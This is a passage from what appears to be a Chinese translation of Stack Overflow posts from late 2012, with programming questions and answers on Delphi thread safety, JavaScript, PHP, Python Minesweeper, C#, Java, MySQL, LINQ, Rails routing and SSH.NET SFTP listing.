例如，您的列表类与之前的许多类一样具有一个`Count`属性和一个索引`Items[]`属性。我将假设您的线程模型允许列表发生变异。现在，假设您想编写如下代码：

```
for i := 0 to List.Count-1 do
  List[i].Frob; 
```

假设另一个线程要在此循环运行时改变列表。好吧，这显然会导致运行时失败。因此，我们可以得出结论，上面的循环需要用锁包裹。这意味着列表的线程安全方面必须暴露在外部。您不能将其全部保留在当前设计中。

如果您希望将锁保留在类内部，则必须删除`Count`and`Items[]`属性。你可以让你的列表看起来像这样（删除了一些部分）：

```
type
  TThreadsafeList<T> = class
  private
    FList: TList<T>;
    procedure Lock;
    procedure Unlock
  public
    procedure Walk(const Visit: TProc<T>);
  end;
....
procedure TThreadsafeList<T>.Walk(const Visit: TProc<T>);
var
  Item: T;
begin
  Lock;
  try
    for Item in FList do
      Visit(Item);
  finally
    Unlock;
  end;
end; 
```

现在你可以用这个替换上面的循环：

```
ThreadsafeList.Walk(
  procedure(Item: TMyItemClass)
  begin
    Item.Frob;
  end
); 
```

扩展此概念以允许您的`Walk`方法支持删除由过程确定的某些项目并不难`Visit`。

但正如你所说，你可以用这样的列表做什么是没有实际意义的。共享数据是多线程的祸根。我建议您找到一种方法来解决您的问题，为每个线程提供它自己所需的所有数据的私有副本。此时您不需要同步，一切都很好。

最后一点。没有单一的线程安全概念。线程安全的含义因上下文而异。Eric Lippert 说得最好：[你称之为“线程安全”的东西是什么？](http://blogs.msdn.com/b/ericlippert/archive/2009/10/19/what-is-this-thing-you-call-thread-safe.aspx)因此，每当您提出这样的问题时，您都应该提供有关您的特定用例和线程模型的大量细节。

# javascript - 使 rangy CSSClassApplier 只切换一个元素，而不是一个类

> ID：13572854
> 
> 赞同：0
> 
> 时间：2012-11-26T20:44:37.990
> 
> 标签：javascript, html, range, rangy

无论如何/我怎样才能让 rangy 的 CSSClassApplier 只切换一个元素，而不是一个类。

我试过了：

```
var applier = rangy.createCssClassApplier(null, {
    elementTagName: 'strong'
}); 
```

但是是行不通的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T01:00:35.700

是的，我担心 CSS 类应用程序完全围绕 CSS 类，所以这行不通。将来会有一个更通用的样式模块。

# javascript - javascript不创建输入框

> ID：13572855
> 
> 赞同：0
> 
> 时间：2012-11-26T20:44:39.683
> 
> 标签：javascript, html, jsp

我真的是javascripting的新手...（我的网页基于jsp）我正在尝试在选择选择框中的选项时生成输入框...当用户从选择框中选择任何输入时，它会将值发送到函数 init() 并根据值生成输入框...

例如：如果

```
<option value="IP,OS" name="sysl"><%=sysname%></option> 
```

被选中..那么它应该生成类似的东西

```
<tr>
<td> Enter IP:</td>
<td><input type="text" id="IP" name="IP"></td>
</tr>
<tr>
<td> Enter OS:</td>
<td><input type="text" id="OS" name="OS"></td>
</tr> 
```

但是我的代码并没有生成任何...

```
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
    <title>Run Batch Script</title>
    <script type="text/javascript">

    function init() {
        document.getElementById("bname").addEventListener("change", function(){
        var value = document.getElementById("bname").value; // this gives you the selected value.
        var split = value.split;
        var splitsize = split.length;
        for (var j=0; j<splitsize; j++){
            var a = "<input type = 'text' name = '" + split[j] + "' id = '" + split[j] + "'>";
            document.getElementById("inputBox").innerHTML = a;
        }
        // Your code to add the element that you need.

        }
    )};

    </script>
<body>
    <form action="./run?host=<%=host%>&envname=<%=envname%>" method="post" name="batchForm">  
    <table border="0">
    <tr style="font-weight: bold; font-size: 16px;">
        <td>System Name: </td>
    </tr> 

     <tr>
        <td>Select Batch : </td>
        <td><select id="bname" name="bname" onclicke="init()">
       <%
       String src = "";
       String[] temp;
       String loc = root + "\\" + "Temp.txt";
       int c;
       int tempsize;
       String param;
       BufferedReader S = new BufferedReader(new FileReader(loc));
       ArrayList<String> list = new ArrayList<String>();
       while ((src = S.readLine()) != null){
            c = 3;
            param = "";
            temp =src.split(":");
            tempsize =temp.length;
            list.add(temp[0]);
            if ((tempsize >2)){
                int i;
                for (i=2; tempsize>i ; i++){

                    if((temp[i].equals("null"))){
                        param = "";
                    }
                    else if ((i ==2) && (temp[i] != "null")){
                        param = temp[i];
                    }
                    else if ((i > 2)){
                        param = param + "," + temp[i];
                    }
                }
            }
            %>
            <option value="<%=param%>" name="<%=temp[0]%>"><%=temp[0]%></option>
                <%
            }
       BatchS.close();
    %>
            </select></td>
     </tr>
     <div id = "inputBox"></div> 
```

我做错什么了？

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T21:18:27.527

您的标签的事件注册有些混乱。正如您所说，您是 javascript 新手，我认为值得对事件注册进行一些解释。

您有两种方法可以在 HTML 标记中注册某些事件。

*   使用一些*onSomething*属性，例如：

`<select onclick="myFunction()"/>`

*   另一种方法是使用 javascript 注册事件处理程序：

`document.getElementById("sysinfo").addEventListener("click", function(){...});`

两者都会起作用。但是，在第一个示例中，处理程序将在页面加载时自动为您注册。第二种方式，必须手动注册处理程序。

在您的代码中，您试图将两者混合使用。

您可以使用标记事件注册，并且该事件是**onchange**（不是大卫指出的 onselect）。或者您必须`init()`在页面加载时调用该函数。一种方法是将以下代码放在 HTML 的末尾，以便在页面加载时注册您的事件。

```
 <script type="text/javascript">
 init();
 </script> 
```

总之，我会这样做：

```
<script type="text/javascript">
   function writeInputs() {
        alert('writing inputs'); //helps checking if the handler is ok .. comment this when done
        var value = document.getElementById("sysinfo").value; // this gives you the selected value.
        var split = value.split;
        var splitsize = split.length;
        var code = '';
        for (var j=0; j<splitsize; j++){
            var a = "<input type = 'text' name = '" + split[j] + "' id = '" + split[j] + "'>";
            code += a;
        }
        document.getElementById("inputBox").innerHTML = code;
   }
</script>

<select id="sysinfo" name="sysname" onchange="writeInputs()"> 
```

*javascript 已经通过解决 JB Nizet 指出的问题得到纠正。我没有测试代码，所以可能有其他问题*

# php - 用于验证 facebook 页面 url 的正则表达式

> ID：13572858
> 
> 赞同：7
> 
> 时间：2012-11-26T20:44:50.720
> 
> 标签：php, regex

我需要验证不应该考虑给定 http/https 或 www 的 facebook 页面 url 吗？

我的意思是以下内容应该被**接受或有效**：

```
www.facebook.com/ABCDE
facebook.com/ABCDE
http://www.facebook.com/ABCDE
https://www.facebook.com/ABCDE 
```

以下内容不应**被接受或无效**：

```
http://www.facebook.com/   => User name/page name not given
http://www.facebook.com/ABC   => User name/page name should have the minimum length of 5. 
```

对于上述要求，我遵循正则表达式，但它没有检查用户名或页面名称，这是唯一的问题。休息工作正常：

```
/^(https?:\/\/)?((w{3}\.)?)facebook.com\/(([a-z\d.]{5,})?)$/ 
```

我对正则表达式很陌生，所以对此不太了解。

任何类型的帮助都将是可观的。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:14:43.113

`parse_url()`可以帮助你。

```
<?php

$array = array(
    "www.facebook.com/ABCDE",
    "facebook.com/ABCDE",
    "http://www.facebook.com/ABCDE",
    "https://www.facebook.com/ABCDE",
    "http://www.facebook.com/",
    "http://www.facebook.com/ABC"
);

foreach ($array as $link) {
    if (strpos($link, "http") === false) {
        $link = "http://" . $link; //parse_url requires a valid URL. A scheme is needed. Add if not already there.
    }
    $url = parse_url($link);
    if (!preg_match("/(www\.)?facebook\.com/", $url["host"])) {
        //Not a facebook URL
        echo "FALSE!";
    }
    elseif (strlen(trim($url["path"], "/")) < 5) {
        //Trailing path (slashes not included) is less than 5
        echo "FALSE!";
    }
    else {
        //None of the above
        echo "TRUE";
    }
    echo "<br>";
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-26T22:56:00.203

试试这个（没有测试过，应该可以）

```
'~^(https?://)?(www\.)?facebook\.com/\w{5,}$~i' 
```

\w 就像 [a-zA-Z0-9_]

罗伯特

# xcode4.5 - xCode 标签未更新

> ID：13572860
> 
> 赞同：1
> 
> 时间：2012-11-26T20:45:02.650
> 
> 标签：xcode4.5

我已经检查了我能找到的所有文章，但我不知道如何解决这个问题。

我正在编写一个应用程序，它将从选择器（有两列）中获取信息，并在按下按钮后将其填充到标签中。没有崩溃或任何事情。日志中唯一的一行是：Unknown class ***PickerView in Interface Builder file。我已经尝试清除构建和我发现的其他 4 个建议，但我无法摆脱它。PickerView 在编译源中。

这是标签更新的代码（忽略我注释掉的内容，iPhone 与 xib 上的间距不同）：

```
-(IBAction)buttonPressed
{
    NSInteger jobRow = [doublePicker selectedRowInComponent:kJobsList];
    NSInteger hourRow = [doublePicker selectedRowInComponent:kHoursList];

    NSString *job = [jobTypes objectAtIndex:jobRow];
    NSString *hour = [hoursTypes objectAtIndex:hourRow];

    NSString *message = [[NSString alloc] initWithFormat:@"%@     %@", job, hour];
    int /*one=0, two=0,*/ three=0, four=0, five=0, six=0;
    bool done = YES;
    while(!done)
    {
        /*if(one == 0)
        {
            label1.text = message;
            one = 1;
            done = NO;
            break;
        }
        if(two == 0)
        {
            label2.text = message;
            two = 1;
            done = NO;
            break;
        }*/
        if(three == 0)
        {
            self.label3.text = message;
            [label3 setNeedsDisplay]; // This is a line of something I found online to try
            three = 1;
            done = NO;
            break;
        }
        if(four == 0)
        {
            self.label4.text = message;
            four = 1;
            done = NO;
            break;
        }
        if(five == 0)
        {
            self.label5.text = message;
            five = 1;
            done = NO;
            break;
        }
        if(six == 0)
        {
            self.label6.text = message;
            six = 1;
            done = NO;
            break;
        }
    }
} 
```

有什么建议么？

# python - 检查矩阵中“b”周围的值

> ID：13572866
> 
> 赞同：1
> 
> 时间：2012-11-26T20:45:26.640
> 
> 标签：python, matrix, minesweeper

扫雷，还是。我找到了一种方法来做到这一点，但我知道必须有一种简化的方法来做到这一点。我必须在矩阵中放置一个数字来表示它周围有多少炸弹（“b”）。这就是我所拥有的，我知道必须有更短的方法。

```
def check(y,x):
    if ((y < 0) or (y >= len(mat1)) or (x < 0) or (x >= len(mat1))):
        return (False)
    else:
        return mat1[y][x]

def addscores():
    for x in range(len(mat1)):
        for y in range(len(mat1)):
            if mat1[y][x] != "b":
                if check(y-1,x-1) == "b" or check(y,x-1) == "b" or check(y+1,x-1) == "b" or check(y+1,x) == "b" or check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) =="b":
                    mat1[y][x] = 1
                if check(y-1,x-1) == "b":
                    if check(y,x-1) == "b" or check(y+1,x-1) == "b" or check(y+1,x) == "b" or check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                        mat1[y][x] = 2
                if check(y,x-1) == "b":
                    if check(y+1,x-1) == "b" or check(y+1,x) == "b" or check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                        mat1[y][x] = 2
                if check(y+1,x-1) == "b":
                    if check(y+1,x) == "b" or check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                         mat1[y][x] = 2
                if check(y+1,x) == "b":
                    if check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                        mat1[y][x] = 2
                if check(y+1,x+1) == "b":
                    if check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                        mat1[y][x] = 2
                if check(y,x+1) == "b":
                    if check(y-1,x+1) == "b" or check(y-1,x) == "b":
                        mat1[y][x] = 2
                if check(y-1,x+1) == "b":
                    if check(y-1,x) == "b":
                        mat1[y][x] = 2
                if check(y-1,x-1) == "b":
                    if check(y,x-1) == "b":
                        if check(y+1,x-1) == "b" or check(y+1,x) == "b" or check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                            mat1[y][x] = 3
                    if check(y+1,x-1) == "b":
                        if check(y+1,x) == "b" or check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                            mat1[y][x] = 3
                    if check(y+1,x) == "b":
                        if check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                            mat1[y][x] = 3
                    if check(y+1,x+1) == "b":
                        if check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                            mat1[y][x] = 3
                    if check(y,x+1) == "b":
                        if check(y-1,x+1) == "b" or check(y-1,x) == "b":
                            mat1[y][x] = 3
                if check(y-1,x-1) == "b":
                    if check(y,x-1) == "b":
                        if check(y+1,x-1) == "b":
                            if check(y+1,x) == "b" or check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                                mat1[y][x] = 4
                    if check(y+1,x-1) == "b":
                        if check(y+1,x) == "b":
                            if check(y+1,x+1) == "b" or check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                                mat1[y][x] = 4
                    if check(y+1,x) == "b":
                        if check(y+1,x+1) == "b":
                            if check(y,x+1) == "b" or check(y-1,x+1) == "b" or check(y-1,x) == "b":
                                mat1[y][x] = 4
                    #ETC 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:01:34.397

```
def check(y,x):
    if ((y < 0) or (x < 0) or (y >= len(mat1)) or (x >= len(mat1))):
        return False
    else:
        if mat1[y][x] == 'b':
            return 1
        else:
            return 0

def check_all(y,x):
    if mat1[y][x] != 'b':        
        return sum([check(y + yy, x + xx) for xx in range(-1,2) for yy in range(-1,2)])
    else:
        return 'b'

def addscores():
    for x in range(len(mat1)):
        for y in range(len(mat1)):
            mat1[y][x] = check_all(y,x) 
```

如果我理解您的操作正确，那么这段代码——尤其是`check_all`函数——应该可以解决您的问题。你是对的，肯定有更短的方法，使用循环（或列表推导，在这种情况下），而不是必须单独写出每个检查。

我尽可能保留了您的代码，因为我没有足够的上下文来知道进行更改是否会破坏任何内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T21:01:05.210

你可以使用这样的东西：

```
def add_scores():
    def bounded_range(i):
        return range(max(0, i - 1), min(len(mat1) - 1, x + 1))

    for x in range(len(mat1)):
        for y in range(len(mat1)):
            Xs = bounded_range(x)
            Ys = bounded_range(y)
            mat1[x][y] = len([0 for _x in Xs for _y in Ys
                    if not (x == _x and y == _x) and mat1[_x][_y] == 'b']) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T21:26:28.770

如果您想了解如何编写 Minesweeper，您可以查看Python Cookbook 上的[MineSweep](http://code.activestate.com/recipes/577365/)，它展示了开发游戏 GUI 版本的十二步过程。

# c# - 在另一个表单上查看列表

> ID：13572870
> 
> 赞同：0
> 
> 时间：2012-11-26T20:45:35.110
> 
> 标签：c#, forms, list

有人可以告诉我我在这里做错了什么吗？我在一个数据库类中有一个列表，我想在表单的列表框中查看它，但它没有显示任何内容。我通过单击第一个表单的按钮来调用表单，这是我输入数据的地方，如果我在该表单上放置一个列表框，它就可以工作，但我想打开另一个表单，它只会在有意义的情况下显示数据? 这是我要查看列表中内容的表单的代码：

```
public partial class Summary : Form
{
    public Summary()
    {
        InitializeComponent();
    }

    private Database viewlist = new Database();

    private void Summary_Load(object sender, EventArgs e)
    {

    }

    private void sum()
    {
        List<String> listofPicks = viewlist.listPickups();
        listBox1.Items.AddRange(listofPicks.ToArray());
    }

    private void button1_Click(object sender, EventArgs e)
    {
        sum();
    }

} 
```

我也可以明确一点，如果这段代码都是在同一个表格上完成的，那么它就可以工作

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:55:03.670

试试这个（有点），在表单加载时加载列表，而不是点击按钮：

```
public partial class Summary : Form
{
    private Database _viewlist = new Database();

    public Summary()
    {
        InitializeComponent();
    }

    private void Summary_Load(object sender, EventArgs e)
    {
        LoadList();
    }

    private void LoadList()
    {
        listBox1.Items.Clear();
        listBox1.Items.AddRange(_viewlist.Pickups.ToArray());
    }
}

public class Database
{
    public List<string> Pickups
    {
        get { return new List<string> {"alfa", "beta"}; }
    }
} 
```

# java - 存储值不起作用？

> ID：13572871
> 
> 赞同：1
> 
> 时间：2012-11-26T20:45:42.973
> 
> 标签：java, arrays

我正在为一个项目使用一个数组来存储货币值，以及一个双变量来保存运行总计。当我通过循环运行我的代码时，用户输入不会存储在数组中，并且不会将任何内容添加到运行总数中。当用户输入 -1 时，它应该打破循环并计算税收等，当输入 0 时，从数组中删除最后一个值。无论我做什么，我都无法将这些值放入数组或运行总计中。我确定我做错了什么是愚蠢的，但我无法发现它。

```
for(i = 0; i < priceArray.length; i++) {
    System.out.print("\nEnter the price of the item...");
    userInput = input.nextDouble();
    if(userInput == -1) { // This will break the user out of the loop.
        break;
    }
    else if(userInput == 0.0) {
        System.out.println("You entered a zero, removing last price of $" + priceArray[i] + ".");
        i--;
        runningTotal =- priceArray[i];
    }
    else if(userInput > 0.0 && userInput < 2999.99) {
        priceArray[i] = userInput;
        priceArray[i] += runningTotal;
        userInput += runningTotal;
        System.out.println("You entered $" + userInput + ", total is $" + runningTotal + ".");
    }
    else {
        i--;
        System.out.println("Please enter a valid value under $2999.99.");
    }// End if.
};// End for 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:18:20.900

这里有几件事是错误的

1）当你计算运行总计时，你做错了（你根本不计算它）：

```
priceArray[i] = userInput;
priceArray[i] += runningTotal;
userInput += runningTotal; 
```

应该是这样的：

```
priceArray[i] = userInput; /* Save the price */
runningTotal += userInput; /* Increment the total */ 
```

现在您将增加 runningTotal 并正确保存价格。

2）当您删除某些内容（输入 0）时，您也做错了。您打印下一个空值，它将为零，然后取反而不是减去。

```
i--; /* Step back one step */
System.out.println("You entered a zero, removing last price of $" + priceArray[i] + ".");
runningTotal -= priceArray[i];
i--; /* The for-loop will increment i for us, so we must subtract one extra time */ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T21:18:49.933

在您尝试删除一个值的情况下，运行总计将会中断。 `runningTotal =- priceArray[i];`将该值设置为您尝试删除的值的负数。您应该使用`-=`而不是`=-`.

如果您尝试添加一个值，您也会弄乱运行总计。

```
priceArray[i] = userInput;
priceArray[i] += runningTotal;
userInput += runningTotal; 
```

我不确定你认为这些线路上发生了什么。您将给定索引处的数组值设置为输入的值，这很棒。然后，您通过将 runningTotal 添加到该值来覆盖该值，这不是您想要的。然后，您通过向其添加 runningTotal 来覆盖输入值，这也不是您想要的。您想在数组中设置值，然后将值添加到 runningTotal，就是这样。

# mysql - 选择本周日期的数据？

> ID：13572876
> 
> 赞同：0
> 
> 时间：2012-11-26T20:45:58.370
> 
> 标签：mysql

如何将我的 SQL 限制为仅包含本周的数据？（周一至周日）

想到：

```
SELECT * FROM log WHERE timestamp >= timestamp - INTERVAL 7 DAY && DAYOFWEEK(timestamp-INTERVAL 7 DAY) > 2 
```

但是有些不对劲……

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:48:03.980

```
SELECT * FROM log 
WHERE yearweek(curdate()) = yearweek(timestamp) 
```

[年周](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_yearweek)

# c# - Linq to SQL with GroupBy 和 Detail - 有没有更好的方法来做到这一点？

> ID：13572877
> 
> 赞同：1
> 
> 时间：2012-11-26T20:46:02.833
> 
> 标签：c#, sql, linq

我有一些 SQL，并试图在 LINQ 中实现等价。这是 SQL：

```
SELECT Categories.CategoryDescription, Categories.CategoryType AS Type, 
       Categories.Category, COUNT(CategoryLinks.OrgID) AS CountOfOrgs 
FROM CategoryLinks 
INNER JOIN Categories ON Categories.CategoryID = CategoryLinks.CategoryID 
GROUP BY Categories.Category, Categories.CategoryType, Categories.CategoryDescription 
ORDER BY CategoryDescription ASC 
```

本质上，我想要一个来自 Categories 表的所有内容的列表以及链接到它的 CategoryLinks 表中 OrgId 的数量。

以下是我目前正在执行的查询。必须有一种更有效的方法来做到这一点。我错了吗？

```
var cnts = (from c in db.Categories
  join cl in db.CategoryLinks on c.CategoryID equals cl.CategoryID
  group new { c, cl } by new
  {
    c.CategoryID
  } into g
  select new
  {
    CategoryID = g.Key.CategoryID,
    categoryCount = g.Count()
  });

  var results = (from c in db.Categories
    join cn in cnts on c.CategoryID equals cn.CategoryID
    select new
    {
      c.CategoryID,
      c.CategoryDescription,
      c.CategoryType,
      Category = c.Category1,
      cn.categoryCount
    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:05:49.957

我想你想使用 GroupJoin 方法：

```
Categories.GroupJoin(
    CategoryLinks, 
    x => x.CategoryID, 
    y => y.CategoryID, 
    (x,y) => new{
        x.CategoryID, 
        x.CategoryDescription, 
        x.CategoryType, 
        Category = x.Category1, 
        CategoryCount = y.Count() }) 
```

在查询语法中，这写为 join..into：

```
from c in db.Categories
    join cl in db.CategoryLinks on c.CategoryID equals cl.CategoryID into catGroup
    select new
                   {
                       c.CategoryID,
                       c.CategoryDescription,
                       c.CategoryType,
                       Category = c.Category1,
                       CategoryCount = catGroup.Count()
                   } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T21:21:53.447

尝试这个：

```
var bbb = categories.Join(categoryLinks, c => c.CategoryID, cl => cl.CategoryId, (c, cl) => new {c, cl})
                    .GroupBy(g => g.c)
                    .Select(g => new {count = g.Count(), Category = g.Key}); 
```

它返回计数和类别中的所有数据。我们按类别中的所有列分组，并将结果放入新的匿名类型变量中，该变量包含 2 个属性：计数，包含计数和类别，类别类型为类别并包含类别行中的所有数据。如果需要，可以将其重写为：

```
var bbb = categories.Join(categoryLinks, c => c.CategoryID, cl => cl.CategoryId, (c, cl) => new {c, cl})
                    .GroupBy(g => g.c)
                    .Select(g => new
                                 {
                                    CategoryID = g.Key.CategoryId,
                                    CategoryDescription = g.Key.CategoryDescription,
                                    CategoryType = g.Key.CategoryType,
                                    Category = g.Key.Category1,
                                    categoryCount = g.Count()
                                 }); 
```

# python - 递归函数中的通用参数：可怕的习惯？

> ID：13572880
> 
> 赞同：0
> 
> 时间：2012-11-26T20:46:11.567
> 
> 标签：python

我发现自己经常这样做。这个例子很简单，但在实践中，有很多复杂的任务来更新数据结构和不调用第二次递归的条件。

我正在处理网格数据。点、边和面存储在单独的字典中，并且“指针”（字典键）被大量使用。

```
import itertools

class Demo(object):
    def __init__(self):
        self.a = {}
        self.b = {}
        self.keygen = itertools.count()

    def add_to_b(self, val):
        new_key = next(self.keygen)
        self.b[new_key] = val
        return new_key

    def recur_method(self, arg, argisval=True):
        a_key = next(self.keygen)
        if argisval is True:
            # arg is a value
            b_key = self.add_to_b(arg)
            self.a[a_key] = b_key
            self.recur_method(b_key, argisval=False)
        else:
            # arg is a key
            self.a[a_key] = arg

demo = Demo()
demo.recur_method(2.2) 
```

有没有更好的办法？没有将我所有的分配代码分成七种不同的方法？无论如何我应该担心这个吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:51:22.700

尝试

```
def recur_method(self, key=None, val=None):
    if key is None and val is None:
       raise exception("You fail it") 
```

如果`None`是有效输入，则使用保护值：

```
sentinel = object()
def recur_method(self, key=sentinel, val=sentinel):
    if key is sentinel and val is sentinel:
       raise exception("You fail it") 
```

# javascript - 如何调用子锚点击父div点击

> ID：13572881
> 
> 赞同：1
> 
> 时间：2012-11-26T20:46:12.480
> 
> 标签：javascript, jquery, colorbox

我有多个实例

```
<div class="picOuterDiv">
   <a href="examplepage.php?var=1" class="iframe" > page one </a>
</div>

<div class="picOuterDiv">
   <a href="examplepage.php?var=2" class="iframe" > page two </a>
</div> 
```

现在我正在使用 jQuery colorbox 插件来创建 Lightbox。当我单击锚元素时，灯箱会打开，即 iframe 类的锚元素。它工作正常，直到这里，使用

```
$(".iframe").colorbox({iframe:true, width:"646", height:"675"}); 
```

我想要的是在单击父 div 时打开颜色框。单击 div 时，我使用以下代码触发锚元素 href，但显然仅 href 是不够的，单击的元素应该具有类 "iframe" 。所以它不适用于此代码。

```
$('.picOuterDiv').each(function(){
        $(this).on('click', function(){
            location.href = $(this).find('a').attr('href');
        });
}); 
```

那么有人可以帮助我如何完成这项工作吗？我希望问题很清楚。先感谢您。

**更新：http:** [//jsfiddle.net/VhkFN/3/](http://jsfiddle.net/VhkFN/3/)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-26T22:55:49.920

```
$('.picOuterDiv').click(function() {
   window.location.href=$(this).find('a').attr('href');
});​ 
```

你的小提琴有几个问题。首先“var arr[]”不正确。其次，超链接没有任何[onclick](https://developer.mozilla.org/en-US/docs/DOM/element.onclick)属性，因此触发点击不会起太大作用。您需要改为获取其 href 属性。

演示：http: [//jsfiddle.net/VhkFN/4/](http://jsfiddle.net/VhkFN/4/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T11:45:32.460

这对我有用。正如我所说，我正在使用 jquery colorbox。

```
$(".picOuterDiv").click(function () {
   var anchorHref = $(this).find('a').attr('href');
   $(this).colorbox ({iframe:true, width:"646", height:"675", href: anchorHref});
}); 
```

# php - 按上次修改对文件数组排序

> ID：13572883
> 
> 赞同：1
> 
> 时间：2012-11-26T20:46:22.500
> 
> 标签：php

使用以下操作，我收集文件列表并显示它们。我需要能够按上次修改日期对文件进行排序。在 PHP 中是否有一种简单的方法或使用 ZEND 来按上次修改对项目进行排序？如果您知道获取文件并使用 ZEND 排序的更简单方法；请告诉我。

```
public function imagesAction()
{
    $this->_helper->layout->disableLayout();

    $results = array();

    $handler = opendir(APPLICATION_PATH . '/../public/images/blog');

    while ($file = readdir($handler)) {
        if ($file != "." && $file != ".." && $file != '.svn') {
            $results[] = $file;
        }
    }

    closedir($handler);

    $this->view->data = $results;
} 
```

我试过做

```
$this->view->data = ksort($results);
$this->view->data = asort($results); 
```

但是那些只是从视图中删除了整个文件列表并且它们停止显示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:52:02.623

```
public function imagesAction()
{
    $this->_helper->layout->disableLayout();

    $results = array();

    $handler = opendir(APPLICATION_PATH . '/../public/images/blog');

    while ($file = readdir($handler)) {
        if ($file != "." && $file != ".." && $file != '.svn') {
            $results[] = array('file' => $file, 'time' => filemtime($file));
        }
    }

    closedir($handler);

    uasort($results, function($file1, $file2) {
        if ( $file1['time'] == $file2['time'] )
           return 0;
        return $file1['time'] < $file2['time'] ? -1 : 1;
    });

    $this->view->data = $results;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:51:07.693

使用最后修改日期作为键：

```
while ($file = readdir($handler)) {
    if ($file != "." && $file != ".." && $file != '.svn') {
        $s = stat($file);
        if (!is_array($results[$s['mtime']]) {
             $results[$s['mtime']] = array();
        }
        $results[$s['mtime']][] = $file;
    }
} 
```

然后使用`ksort`按键排序：

```
ksort($results); 
```

now 的每个项目都`$results`包含一个同时修改的文件名数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:52:16.087

您可以使用 DirectoryIterator ( [http://php.net/manual/en/class.directoryiterator.php](http://php.net/manual/en/class.directoryiterator.php) ) 轻松迭代目录中的文件并获取每个文件的属性（包括上次修改时间）。

您可以简单地实例化迭代器，遍历它并将项目排序到您选择的数组中。

# ruby-on-rails-3 - Rails 3路由与令牌匹配

> ID：13572884
> 
> 赞同：0
> 
> 时间：2012-11-26T20:46:27.863
> 
> 标签：ruby-on-rails-3, routes

我正在尝试设置一个保留请求格式的重定向。但是，在某些情况下，没有指定格式，我也需要考虑这一点。

我认为格式是路径的一部分，所以一开始我是这样设置的......

```
match 'v:api/*path', :to => redirect("/%{path}") 
```

但是，格式不是请求的一部分。因此，当指定格式时，将其更改为 this 将起作用。

```
match 'v:api/*path', :to => redirect("/%{path}.%{format}") 
```

缺点是在某些情况下没有指定格式，这会导致错误，因为它无法匹配格式。

所以我的问题是......创建这个包罗万象的正确方法是什么？

目的是，如果指定了版本号，而该路由的版本不存在，则它应该转到根路由，而不指定版本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T21:00:56.013

好吧，我想我已经想通了。预先警告，虽然它很丑...

```
match '/v:api/*path', to: redirect { |params, request|
  if params[:format]
    "/#{params[:path]}.#{params[:format]}"
  else
    "/#{params[:path]}"
  end
} 
```

# c# - SSH.NET SFTP 递归获取目录和文件列表

> ID：13572889
> 
> 赞同：15
> 
> 时间：2012-11-26T20:46:45.357
> 
> 标签：c#, .net, sftp, ssh.net

我正在使用 Renci.SshNet 库通过 SFTP 递归获取文件和目录列表。我可以连接 SFTP 站点，但我不确定如何在 C# 中递归获取目录和文件列表。我还没有找到任何有用的例子。

有人试过这个吗？如果是这样，您能否发布一些有关如何递归获取这些文件和文件夹的示例代码。

谢谢，
普拉夫

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2014-07-01T18:57:41.860

这个库有一些使这个递归列表变得棘手的怪癖，因为 和 之间的交互`ChangeDirectory`并不`ListDirectory`像您预期​​的那样工作。

以下不**列出**/home 目录中的文件，而是列出 /（根）目录中的文件：

```
sftp.ChangeDirectory("home");
sftp.ListDirectory("").Select (s => s.FullName); 
```

以下不起作用**并**返回 SftpPathNotFoundException：

```
sftp.ChangeDirectory("home");
sftp.ListDirectory("home").Select (s => s.FullName); 
```

以下是列出/home目录下文件的正确方法

```
sftp.ChangeDirectory("/");
sftp.ListDirectory("home").Select (s => s.FullName); 
```

如果你问我，这太疯狂了。使用方法设置默认目录对`ChangeDirectory`方法没有影响，`ListDirectory`除非您在此方法的参数中指定文件夹。似乎应该为此编写一个错误。

